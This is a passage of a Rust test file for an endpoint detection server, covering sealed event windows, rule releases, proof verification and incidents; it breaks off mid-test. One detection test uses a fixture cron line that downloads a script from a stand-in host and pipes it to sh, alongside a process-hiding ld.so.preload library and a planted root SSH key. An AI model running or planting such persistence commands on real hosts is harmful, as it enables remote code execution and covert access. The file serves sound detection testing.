+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events s JOIN events e ON e.id = s.event_id WHERE s.agent_id = ? AND e.event_type = 'process'", "web-host").await, 2);
+    let release: (i64, i64, String, i64, i64, String, bool) = sqlx::query_as("SELECT window, trigger_idx, rule, pid, started_at, context, proven FROM releases WHERE agent_id = 'web-host'").fetch_one(&pool).await.unwrap();
+    assert_eq!(release, (1, 4, "server-child".to_string(), 21, 2, "[1]".to_string(), false));
+}
+
+#[tokio::test]
+async fn test_a_connection_finding_opens_the_connection_its_process_and_the_parent() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "shell-host").await;
+
+    host.deliver(&app, &[started(50, 400, 1, "/usr/sbin/sshd", &[]), quiet(60), started(70, 401, 400, "/bin/bash", &["deploy.sh"]), connected(71, 402, 443)]).await;
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "shell-host").await, 0);
+    host.deliver(&app, &[quiet(61), connected(80, 401, 8443), connected(81, 401, 9000), wrote(82, 401, "/opt/app/run.sh")]).await;
+
+    let recorded = findings(&pool, "shell-host").await;
+    assert_eq!(recorded.iter().map(|finding| finding["rule"].as_str().unwrap()).collect::<Vec<_>>(), ["shell-network", "drops-executable"]);
+    let reached = &recorded[0];
+    assert_eq!((reached["subject"].as_str(), reached["parent"].as_str(), reached["image"].as_str(), reached["level"].as_str()), (Some("203.0.113.47:8443"), Some("sshd"), Some("/bin/bash"), Some("medium")));
+    assert_eq!((reached["pid"].as_u64(), reached["started_at"].as_u64(), reached["trigger"].as_u64(), reached["window"].as_u64()), (Some(401), Some(70), Some(5), Some(1)));
+    assert_eq!(recorded[1]["subject"], "/opt/app/run.sh");
+    assert_eq!(open_incidents(&pool, "shell-host").await, vec!["detection.drops-executable"], "a medium finding is recorded without an incident");
+
+    let opened: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'shell-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
+    assert_eq!(opened, [0, 2, 5, 7], "the second connection of the same shell opens nothing more");
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", "shell-host").await, 2, "an event two rules read is stored once");
+    assert_eq!(hunt_total(&app, "connection where process.name = bash and dest.port = 8443").await, 1);
+    assert_eq!(hunt_total(&app, "connection where dest.port in (443, 9000)").await, 0);
+    assert_eq!(hunt_total(&app, "file where process.name = bash and action = Write").await, 1);
+    let (_, shell) = hunt(&app, Some(&admin_token("user")), "process where name = bash and parent.name = sshd").await;
+    assert_eq!(shell["rows"][0]["process"], "401@70", "the process row carries the key the connection and the finding carry");
+}
+
+#[tokio::test]
+async fn test_an_autostart_finding_opens_the_item_alone() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "autostart-host").await;
+    let fetch = "* * * * * root curl -fsS http://203.0.113.47/u | sh";
+
+    host.deliver(
+        &app,
+        &[
+            autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None),
+            autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", fetch, None),
+            autostart(InventoryAction::Added, PersistenceKind::Cron, "logrotate2", "/etc/cron.d/logrotate2", fetch, None),
+            autostart(InventoryAction::Added, PersistenceKind::LdPreload, "libprocesshider.so", "/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so", None),
+            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519", None),
+        ],
+    )
+    .await;
+
+    let recorded = findings(&pool, "autostart-host").await;
+    let told: Vec<(&str, &str, &str, &str)> = recorded
+        .iter()
+        .map(|finding| (finding["rule"].as_str().unwrap(), finding["subject"].as_str().unwrap(), finding["autostart"].as_str().unwrap(), finding["technique"].as_str().unwrap()))
+        .collect();
+    assert_eq!(
+        told,
+        [
+            ("autostart-fetch", "sysupdate", "cron", "T1053.003"),
+            ("autostart-fetch", "logrotate2", "cron", "T1053.003"),
+            ("preload-added", "libprocesshider.so", "ld_preload", "T1574.006"),
+            ("root-key-added", "root@build", "authorized_key", "T1098.004"),
+        ],
+        "two items found in the same look are two findings"
+    );
+    assert_eq!((recorded[0]["image"].as_str(), recorded[0]["command"].as_str(), recorded[0]["pid"].as_u64(), recorded[0]["parent"].is_null()), (Some("/etc/cron.d/sysupdate"), Some(fetch), Some(0), true));
+    assert_eq!(open_incidents(&pool, "autostart-host").await, vec!["detection.autostart-fetch", "detection.preload-added"]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'persistence'", "autostart-host").await, 4);
+    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl").await, 2);
+    assert_eq!(hunt_total(&app, "persistence where name = ssh.service").await, 0);
+}
+
+fn nginx_and_its_shell() -> (SensorEvent, SensorEvent) {
+    (started(1, 20, 0, "/usr/sbin/nginx", &[]), started(2, 21, 20, "/bin/sh", &["-c", "id"]))
+}
+
+async fn assert_nothing_was_opened(pool: &SqlitePool, agent_id: &str, case: &str) {
+    assert_eq!(open_incidents(pool, agent_id).await, vec!["release_invalid"], "{}", case);
+    assert!(incident_evidence(pool, agent_id, "release_invalid").await["reason"].as_str().is_some_and(|reason| !reason.is_empty()), "{}", case);
+    assert_eq!(count(pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type IN ('process', 'network', 'file', 'persistence', 'package', 'detection')", agent_id).await, 0, "{}", case);
+    assert_eq!(count(pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND (opened_at IS NOT NULL OR event_id IS NOT NULL)", agent_id).await, 0, "{}", case);
+    assert_eq!(count(pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", agent_id).await, 0, "{}", case);
+    assert_eq!(count(pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ?", agent_id).await, 0, "{}", case);
+}
+
+#[tokio::test]
+async fn test_a_release_that_does_not_hold_opens_nothing_and_raises_an_incident() {
+    let (app, pool) = create_test_app_with_pool().await;
+    type Change = fn(&mut Release, &TestLedger);
+    let cases: [(&str, Change); 13] = [
+        ("a seed that opens nothing", |release, _| release.openings[0].seed = hash_to_hex(&[1u8; 32])),
+        ("the seed of another event", |release, ledger| release.openings[1].seed = ledger.opening(1).seed),
+        ("seeds given to the wrong events", |release, _| {
+            let (trigger, parent) = (release.openings[0].seed.clone(), release.openings[1].seed.clone());
+            release.openings[0].seed = parent;
+            release.openings[1].seed = trigger;
+        }),
+        ("a seed that is not hex", |release, _| release.openings[0].seed = "seed".to_string()),
+        ("a missing opening", |release, _| {
+            release.openings.pop();
+        }),
+        ("an extra opening", |release, ledger| release.openings.push(ledger.opening(2))),
+        ("an opening given twice in place of another", |release, _| release.openings[1] = release.openings[0].clone()),
+        ("a rule that does not exist", |release, _| release.rule = "no-such-rule".to_string()),
+        ("another rule than its events fit", |release, _| release.rule = "shell-network".to_string()),
+        ("another process than its event shows", |release, _| release.pid = 99),
+        ("a context that does not come before the trigger", |release, ledger| {
+            release.context = vec![3];
+            release.openings[1] = ledger.opening(3);
+        }),
+        ("more context than any rule reads", |release, ledger| {
+            release.context = vec![0, 1, 2];
+            release.openings = [3, 0, 1, 2].map(|index| ledger.opening(index)).to_vec();
+        }),
+        ("a trigger from an earlier window", |release, ledger| {
+            *release = Release { trigger: 1, rule: "writable-image".to_string(), context: Vec::new(), pid: 30, started_at: 30, openings: vec![ledger.opening(1)] };
+        }),
+    ];
+
+    for (number, (case, change)) in cases.into_iter().enumerate() {
+        let agent_id = format!("release-host-{}", number);
+        let mut host = enroll_endpoint(&app, &pool, &agent_id).await;
+        let (nginx, shell) = nginx_and_its_shell();
+        host.deliver(&app, &[nginx, quiet(30)]).await;
+
+        let mut window = host.ledger.seal(&[quiet(31), shell]);
+        assert_eq!(window.releases.len(), 1);
+        change(&mut window.releases[0], &host.ledger);
+        let (status, ack) = host.send(&app, window).await;
+        assert_eq!(status, StatusCode::OK, "{}: the window itself is held, {}", case, ack);
+        assert_eq!(ack["next_index"], 4, "{}", case);
+        assert_nothing_was_opened(&pool, &agent_id, case).await;
+    }
+}
+
+#[tokio::test]
+async fn test_a_release_cannot_reach_into_another_epoch_or_be_given_twice() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let (nginx, shell) = nginx_and_its_shell();
+
+    let mut restarted = enroll_endpoint(&app, &pool, "epoch-host").await;
+    restarted.deliver(&app, &[nginx.clone(), quiet(30)]).await;
+    restarted.restart();
+    let mut window = restarted.ledger.seal(&[quiet(31), shell.clone()]);
+    assert!(window.releases.is_empty(), "the rules start over with the epoch, so they no longer know the parent");
+    window.releases.push(Release { trigger: 3, rule: "server-child".to_string(), context: vec![0], pid: 21, started_at: 2, openings: vec![restarted.ledger.opening(3), restarted.ledger.opening(0)] });
+    let (status, _) = restarted.send(&app, window).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_nothing_was_opened(&pool, "epoch-host", "a context from another epoch").await;
+    assert!(incident_evidence(&pool, "epoch-host", "release_invalid").await["reason"].as_str().unwrap().contains("another epoch"));
+
+    let mut repeating = enroll_endpoint(&app, &pool, "repeating-host").await;
+    repeating.deliver(&app, &[nginx, quiet(30)]).await;
+    let mut window = repeating.ledger.seal(&[quiet(31), shell]);
+    window.releases.push(window.releases[0].clone());
+    let (status, _) = repeating.send(&app, window).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(open_incidents(&pool, "repeating-host").await, vec!["detection.server-child", "release_invalid"]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "repeating-host").await, 1);
+    assert_eq!(findings(&pool, "repeating-host").await.len(), 1);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", "repeating-host").await, 2);
+}
+
+#[tokio::test]
+async fn test_an_opened_event_must_be_the_one_its_leaf_commits_to() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "swapping-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(&app, &[nginx, quiet(30)]).await;
+
+    let mut window = host.ledger.seal(&[quiet(31), shell]);
+    let harmless = started(2, 21, 20, "/bin/sh", &["-c", "true"]).to_bytes();
+    let ledger = &host.ledger;
+    let seed = seal::seed(&ledger.master, &ledger.agent, ledger.epoch, 3, &harmless);
+    window.events[1].sealed = bytes_to_base64(&seal::seal(&seed, &ledger.agent, ledger.epoch, 3, &harmless).unwrap());
+    window.releases[0].openings[0].seed = hash_to_hex(&seed);
+
+    let (status, _) = host.send(&app, window).await;
+    assert_eq!(status, StatusCode::OK, "the header and the leaves are those of the events that happened");
+    assert_nothing_was_opened(&pool, "swapping-host", "sealed bytes that open to another event than the committed one").await;
+    assert!(incident_evidence(&pool, "swapping-host", "release_invalid").await["reason"].as_str().unwrap().contains("leaf commits to"));
+}
+
+#[tokio::test]
+async fn test_a_window_that_says_events_were_lost_opens_a_gap_incident() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "lossy-host").await;
+    host.deliver(&app, &[quiet(1)]).await;
+    assert!(open_incidents(&pool, "lossy-host").await.is_empty());
+
+    let window = host.ledger.seal_marked(&[quiet(2)], true);
+    let (status, _) = host.send(&app, window).await;
+    assert_eq!(status, StatusCode::OK, "the chain says so itself, the window is held");
+    assert_eq!(open_incidents(&pool, "lossy-host").await, vec!["chain_gap"]);
+    assert_eq!(incident_evidence(&pool, "lossy-host", "chain_gap").await, serde_json::json!({ "window": 1, "epoch": 1, "first_index": 1 }));
+}
+
+#[tokio::test]
+async fn test_a_window_is_read_above_the_event_batch_limit_and_refused_above_its_own() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "busy-host").await;
+
+    let large: Vec<SensorEvent> = (0u32..12).map(|pid| started(u64::from(pid), pid, 1, "/usr/bin/java", &["-cp", &"x".repeat(200_000)])).collect();
+    let window = host.ledger.seal(&large);
+    let body = host.request(window);
+    assert!(body.len() > zedr_protocol::MAX_EVENT_BATCH_BYTES);
+    let (status, _) = send_signed(&app, &host.agent, "/api/windows", body).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND LENGTH(ciphertext) = 262144 + 16", "busy-host").await, 12);
+
+    let many: Vec<SensorEvent> = (100u32..1300).map(quiet).collect();
+    host.deliver(&app, &many).await;
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "busy-host").await, 1212);
+    assert_eq!(count(&pool, "SELECT MAX(idx) FROM sealed_events WHERE agent_id = ?", "busy-host").await, 1211);
+
+    let mut too_large = host.ledger.clone().seal(&[quiet(1)]);
+    too_large.agent_id = "x".repeat(zedr_control_server::api::ingestion::windows::MAX_WINDOW_BYTES);
+    let body = serde_json::to_string(&too_large).unwrap();
+    let (status, _) = send_signed(&app, &host.agent, "/api/windows", body).await;
+    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
+}
+
+async fn tell_a_story(app: &axum::Router, host: &mut Endpoint) {
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(app, &[nginx, quiet(30)]).await;
+    host.deliver(app, &[quiet(31), shell]).await;
+    host.deliver(app, &[quiet(32)]).await;
+}
+
+#[tokio::test]
+async fn test_a_proof_marks_its_windows_verified_and_its_findings_proven() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "proving-host").await;
+    tell_a_story(&app, &mut host).await;
+    assert_eq!(proof_states(&pool, "proving-host").await, ["pending", "pending", "pending"]);
+
+    let journal = host.ledger.journal(3);
+    assert_eq!(journal.matches.len(), 1);
+    let (status, ack) = host.prove(&app, &journal).await;
+    assert_eq!(status, StatusCode::OK, "{}", ack);
+    assert_eq!(ack, serde_json::json!({ "first_window": 0, "last_window": 2 }));
+
+    assert_eq!(proof_states(&pool, "proving-host").await, ["verified", "verified", "verified"]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "proving-host").await, 1);
+    assert_eq!(findings(&pool, "proving-host").await[0]["proof"], "verified");
+    assert_eq!(findings(&pool, "proving-host").await[0]["parent"], "nginx", "the rest of the evidence is as it was");
+    assert_eq!(incident_evidence(&pool, "proving-host", "detection.server-child").await["proof"], "verified");
+    assert_eq!(open_incidents(&pool, "proving-host").await, vec!["detection.server-child"]);
+
+    let stored: (i64, i64, i64, String, String, String) = sqlx::query_as("SELECT epoch, first_window, last_window, image_id, state_in, state_out FROM proofs WHERE agent_id = 'proving-host'").fetch_one(&pool).await.unwrap();
+    assert_eq!(stored, (1, 0, 2, hash_to_hex(&TEST_IMAGE_ID), hash_to_hex(&GENESIS), hash_to_hex(&journal.state_out)));
+    let proven: (i64, String) = sqlx::query_as("SELECT proven_window, proven_state FROM chain_positions WHERE agent_id = 'proving-host'").fetch_one(&pool).await.unwrap();
+    assert_eq!(proven, (2, hash_to_hex(&journal.state_out)));
+}
+
+#[tokio::test]
+async fn test_a_second_proof_chains_from_the_first_and_a_proof_sent_again_changes_nothing() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "chaining-host").await;
+    tell_a_story(&app, &mut host).await;
+    host.deliver(&app, &[connected(40, 21, 443)]).await;
+    host.deliver(&app, &[quiet(33)]).await;
+
+    let first = host.ledger.journal(2);
+    assert_eq!(host.prove(&app, &first).await.0, StatusCode::OK);
+    assert_eq!(proof_states(&pool, "chaining-host").await, ["verified", "verified", "pending", "pending", "pending"]);
+
+    let second = host.ledger.journal(3);
+    assert!(!second.fresh && second.state_in == first.state_out);
+    assert_eq!(second.matches.len(), 1, "the shell reached the network, which only the rule state of the first proof can tell");
+
+    let mut forgetful = second.clone();
+    forgetful.state_in = [3u8; 32];
+    let (status, _) = host.prove(&app, &forgetful).await;
+    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a proof that starts from another rule state than the last one left");
+    assert_eq!(open_incidents(&pool, "chaining-host").await, vec!["detection.server-child", "proof_invalid"]);
+    sqlx::query("UPDATE incidents SET closed_at = opened_at WHERE incident_type = 'proof_invalid'").execute(&pool).await.unwrap();
+
+    let (status, ack) = host.prove(&app, &second).await;
+    assert_eq!((status, ack), (StatusCode::OK, serde_json::json!({ "first_window": 2, "last_window": 4 })));
+    assert_eq!(proof_states(&pool, "chaining-host").await, ["verified"; 5]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "chaining-host").await, 2);
+    assert_eq!(count(&pool, "SELECT proven_window FROM chain_positions WHERE agent_id = ?", "chaining-host").await, 4);
+
+    for journal in [&first, &second] {
+        let (status, ack) = host.prove(&app, journal).await;
+        assert_eq!(status, StatusCode::OK, "the answer to a proof may have been lost on its way: {}", ack);
+    }
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM proofs WHERE agent_id = ?", "chaining-host").await, 2);
+    assert_eq!(count(&pool, "SELECT proven_window FROM chain_positions WHERE agent_id = ?", "chaining-host").await, 4);
+    assert_eq!(open_incidents(&pool, "chaining-host").await, vec!["detection.server-child"]);
+
+    let mut another_ending = first.clone();
+    another_ending.state_out = [4u8; 32];
+    assert_eq!(host.prove(&app, &another_ending).await.0, StatusCode::UNPROCESSABLE_ENTITY, "the windows have their proof, another one for them is not taken");
+}
+
+#[tokio::test]
+async fn test_a_proof_that_contradicts_what_the_server_holds_is_refused() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "refused-host").await;
+    tell_a_story(&app, &mut host).await;
+
+    let honest = host.ledger.journal(3);
+    let mut skipping = host.ledger.clone();
+    skipping.proven = 0;
+    skipping.journal(1);
+    let orphan = skipping.journal(2);
+    assert!(!orphan.fresh && orphan.first_window == 1);
+
+    type Change = fn(&mut Journal);
+    let cases: [(&str, Change); 14] = [
+        ("a window the server does not hold", |journal| journal.last_window = 3),
+        ("windows the server never saw", |journal| (journal.first_window, journal.last_window) = (7, 9)),
+        ("a range that ends before it starts", |journal| (journal.first_window, journal.last_window) = (2, 0)),
+        ("another head before the first window", |journal| journal.head_in = [1u8; 32]),
+        ("another head after the last window", |journal| journal.head_out = [1u8; 32]),
+        ("another agent", |journal| journal.agent = [1u8; 32]),
+        ("a journal version this server does not read", |journal| journal.version = JOURNAL_VERSION + 1),
+        ("another epoch", |journal| journal.epoch = 2),
+        ("a fresh epoch told as a continued one", |journal| journal.fresh = false),
+        ("a fresh epoch that starts from a rule state", |journal| journal.state_in = [1u8; 32]),
+        ("another first event", |journal| journal.first_index = 1),
+        ("another last event", |journal| journal.next_index += 1),
+        ("fewer windows than its heads span", |journal| journal.last_window = 1),
+        ("numbers no chain has", |journal| journal.next_index = u64::MAX),
+    ];
+    let mut refused: Vec<(&str, Vec<u8>)> = cases
+        .into_iter()
+        .map(|(case, change)| {
+            let mut journal = honest.clone();
+            change(&mut journal);
+            (case, journal.to_bytes())
+        })
+        .collect();
+    refused.push(("a continued epoch with no proof before it", orphan.to_bytes()));
+    refused.push(("a receipt that does not verify", Vec::new()));
+    refused.push(("a journal that cannot be read", b"not a journal".to_vec()));
+    let mut trailing = honest.to_bytes();
+    trailing.push(0);
+    refused.push(("a journal with bytes after its end", trailing));
+
+    for (case, receipt) in refused {
+        let (status, answer) = host.submit(&app, &receipt).await;
+        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{}: {}", case, answer);
+        assert_eq!(open_incidents(&pool, "refused-host").await, vec!["detection.server-child", "proof_invalid"], "{}", case);
+        assert!(incident_evidence(&pool, "refused-host", "proof_invalid").await["reason"].is_string(), "{}", case);
+        sqlx::query("DELETE FROM incidents WHERE incident_type = 'proof_invalid'").execute(&pool).await.unwrap();
+        assert_eq!(proof_states(&pool, "refused-host").await, ["pending", "pending", "pending"], "{}", case);
+        assert_eq!(count(&pool, "SELECT COUNT(*) FROM proofs WHERE agent_id = ?", "refused-host").await, 0, "{}", case);
+    }
+
+    host.agent.seq += 1;
+    let not_base64 = serde_json::json!({ "agent_id": "refused-host", "session": host.agent.session, "seq": host.agent.seq, "receipt": "not base64!" }).to_string();
+    assert_eq!(send_signed(&app, &host.agent, "/api/proofs", not_base64).await.0, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ? AND incident_type = 'proof_invalid'", "refused-host").await, 1);
+
+    assert_eq!(host.prove(&app, &honest).await.0, StatusCode::OK, "after all of that, the proof the endpoint really has is taken");
+    assert_eq!(proof_states(&pool, "refused-host").await, ["verified", "verified", "verified"]);
+}
+
+#[tokio::test]
+async fn test_a_proof_tells_a_match_the_endpoint_did_not_release() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "hiding-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(&app, &[nginx, quiet(30)]).await;
+    let mut window = host.ledger.seal(&[quiet(31), shell]);
+    window.releases.clear();
+    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
+    host.deliver(&app, &[quiet(32)]).await;
+    assert!(open_incidents(&pool, "hiding-host").await.is_empty(), "until it is proven, a hidden match shows nowhere");
+
+    let journal = host.ledger.journal(2);
+    let (status, ack) = host.prove(&app, &journal).await;
+    assert_eq!(status, StatusCode::OK, "the proof itself is sound: {}", ack);
+    assert_eq!(open_incidents(&pool, "hiding-host").await, vec!["match_not_released"]);
+    assert_eq!(
+        incident_evidence(&pool, "hiding-host", "match_not_released").await,
+        serde_json::json!({ "epoch": 1, "first_window": 0, "last_window": 1, "matches": [{ "trigger": 3, "rule": "server-child", "context": [0], "pid": 21, "started_at": 2 }] })
+    );
+    assert_eq!(proof_states(&pool, "hiding-host").await, ["mismatch", "mismatch", "pending"]);
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND opened_at IS NOT NULL", "hiding-host").await, 0, "the server learns that a rule fired, not what the event says");
+
+    let next = host.ledger.journal(1);
+    assert_eq!(host.prove(&app, &next).await.0, StatusCode::OK, "the proofs after it still chain");
+    assert_eq!(proof_states(&pool, "hiding-host").await, ["mismatch", "mismatch", "verified"]);
+}
+
+#[tokio::test]
+async fn test_a_proof_tells_a_release_no_rule_stands_behind() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "overclaiming-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    host.deliver(&app, &[nginx, quiet(30)]).await;
+    let mut window = host.ledger.seal(&[quiet(31), shell]);
+    window.releases.push(Release { trigger: 2, rule: "writable-image".to_string(), context: Vec::new(), pid: 31, started_at: 31, openings: vec![host.ledger.opening(2)] });
+    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
+    assert_eq!(open_incidents(&pool, "overclaiming-host").await, vec!["detection.server-child", "detection.writable-image"], "the release has the shape of its rule, so it is applied");
+
+    let journal = host.ledger.journal(2);
+    assert_eq!(journal.matches.len(), 1);
+    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::OK);
+    assert_eq!(open_incidents(&pool, "overclaiming-host").await, vec!["detection.server-child", "detection.writable-image", "release_not_proven"]);
+    assert_eq!(
+        incident_evidence(&pool, "overclaiming-host", "release_not_proven").await,
+        serde_json::json!({ "epoch": 1, "first_window": 0, "last_window": 1, "releases": [{ "trigger": 2, "rule": "writable-image", "context": [], "pid": 31, "started_at": 31 }] })
+    );
+    assert_eq!(proof_states(&pool, "overclaiming-host").await, ["mismatch", "mismatch"]);
+
+    let proven: Vec<(String, bool)> = sqlx::query_as("SELECT rule, proven FROM releases WHERE agent_id = 'overclaiming-host' ORDER BY rule").fetch_all(&pool).await.unwrap();
+    assert_eq!(proven, [("server-child".to_string(), true), ("writable-image".to_string(), false)], "the release the proof does tell is proven all the same");
+    let told: Vec<(String, String)> = findings(&pool, "overclaiming-host").await.iter().map(|finding| (finding["rule"].as_str().unwrap().to_string(), finding["proof"].as_str().unwrap().to_string())).collect();
+    assert_eq!(told, [("server-child".to_string(), "verified".to_string()), ("writable-image".to_string(), "pending".to_string())]);
+}
+
+#[tokio::test]
+async fn test_windows_of_an_endpoint_without_a_prover_wait_for_no_proof_and_take_none() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "unproving-host").await;
+    let (nginx, shell) = nginx_and_its_shell();
+    for events in [vec![nginx, quiet(30)], vec![quiet(31), shell]] {
+        let mut window = host.ledger.seal(&events);
+        window.proving = false;
+        assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
+    }
+    assert_eq!(proof_states(&pool, "unproving-host").await, ["none", "none"]);
+    assert_eq!(findings(&pool, "unproving-host").await.len(), 1, "its findings are taken as they come");
+
+    let journal = host.ledger.journal(2);
+    assert_eq!(host.prove(&app, &journal).await.0, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(open_incidents(&pool, "unproving-host").await, vec!["detection.server-child", "proof_invalid"]);
+    assert_eq!(proof_states(&pool, "unproving-host").await, ["none", "none"]);
+}
+
+#[tokio::test]
+async fn test_proofs_require_a_valid_signature_and_a_receipt_of_an_accepted_program() {
+    let (app, pool) = create_test_app_with_pool().await;
+    let mut host = enroll_endpoint(&app, &pool, "receipt-host").await;
+    host.deliver(&app, &[quiet(1)]).await;
+    let journal = host.ledger.journal(1);
+
+    let body = serde_json::json!({ "agent_id": "receipt-host", "session": host.agent.session, "seq": host.agent.seq + 1, "receipt": bytes_to_base64(&journal.to_bytes()) }).to_string();
+    assert_eq!(post_agent(&app, "/api/proofs", body.clone(), None).await.0, StatusCode::UNAUTHORIZED);
+    let impostor = TestAgent::new("receipt-host");
+    assert_eq!(send_signed(&app, &impostor, "/api/proofs", body).await.0, StatusCode::UNAUTHORIZED);
+    assert!(open_incidents(&pool, "receipt-host").await.is_empty());
+
+    let (status, answer) = host.prove(&app, &journal).await;
+    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a journal alone is no receipt: {}", answer);
+    assert_eq!(open_incidents(&pool, "receipt-host").await, vec!["proof_invalid"]);
+    assert_eq!(proof_states(&pool, "receipt-host").await, ["pending"]);
+
+    let (status, _) = post_agent(&app, "/api/proofs", "{ not a proof".to_string(), Some("00")).await;
+    assert_eq!(status, StatusCode::BAD_REQUEST);
+}
+
+#[tokio::test]
+async fn test_a_proof_that_is_overdue_opens_one_incident_for_an_agent_that_is_alive() {
+    let (app, pool) = create_proving_app().await;
+    let mut waiting = enroll_endpoint(&app, &pool, "overdue-host").await;
+    let mut asleep = enroll_endpoint(&app, &pool, "asleep-host").await;
+    let mut unproving = enroll_endpoint(&app, &pool, "no-prover-host").await;
+    let mut prompt = enroll_endpoint(&app, &pool, "prompt-host").await;
+
+    waiting.deliver(&app, &[quiet(1)]).await;
+    waiting.deliver(&app, &[quiet(2)]).await;
+    asleep.deliver(&app, &[quiet(1)]).await;
+    sqlx::query("UPDATE agents SET liveness_state = 'stale' WHERE id = 'asleep-host'").execute(&pool).await.unwrap();
+    let mut window = unproving.ledger.seal(&[quiet(1)]);
+    window.proving = false;
+    assert_eq!(unproving.send(&app, window).await.0, StatusCode::OK);
+    prompt.deliver(&app, &[quiet(1)]).await;
+    let journal = prompt.ledger.journal(1);
+    assert_eq!(prompt.prove(&app, &journal).await.0, StatusCode::OK);
+
+    let (events_tx, _) = tokio::sync::broadcast::channel(16);
+    let received = count(&pool, "SELECT MIN(received_at) FROM sealed_windows WHERE agent_id = ?", "overdue-host").await;
+    let sweep = |now: i64, deadline: i64| {
+        let (pool, events_tx) = (pool.clone(), events_tx.clone());
+        async move { zedr_control_server::proofs::sweep_once(&pool, &events_tx, now, deadline).await.unwrap() }
+    };
+
+    sweep(received + 3600, 3600).await;
+    assert!(open_incidents(&pool, "overdue-host").await.is_empty(), "an hour is allowed");
+
+    sweep(received + 3601, 3600).await;
+    assert_eq!(open_incidents(&pool, "overdue-host").await, vec!["proof_overdue"]);
+    let evidence = incident_evidence(&pool, "overdue-host", "proof_overdue").await;
+    assert_eq!((evidence["window"].as_i64(), evidence["waiting_secs"].as_i64(), evidence["received_at"].as_i64()), (Some(0), Some(3601), Some(received)));
+
+    sweep(received + 9000, 3600).await;
+    assert_eq!(count(&pool, "SELECT COUNT(*) FROM incidents WHERE agent_id = ?", "overdue-host").await, 1, "a proof that stays overdue is one incident, not one per sweep");
+    for agent_id in ["asleep-host", "no-prover-host", "prompt-host"] {
+        assert!(open_incidents(&pool, agent_id).await.is_empty(), "{} owes no proof now", agent_id);
+    }
+
+    sweep(received + 100, 60).await;
+    assert!(open_incidents(&pool, "asleep-host").await.is_empty(), "the deadline can be set, and an endpoint that is not alive is still not asked");
+}
+
+#[tokio::test]
+async fn test_the_console_reads_the_chain_of_an_agent() {
+    let (app, pool) = create_proving_app().await;
+    let mut host = enroll_endpoint(&app, &pool, "chain-host").await;
+    enroll_endpoint(&app, &pool, "empty-host").await;
+    tell_a_story(&app, &mut host).await;
+    let window = host.ledger.seal_marked(&[quiet(33)], true);
+    assert_eq!(host.send(&app, window).await.0, StatusCode::OK);
+    let reader = admin_token("user");
+
+    let (status, chain) = call(&app, "GET", "/api/admin/agents/chain-host/chain", Some(&reader), None).await;
+    assert_eq!(status, StatusCode::OK);
+    assert_eq!(
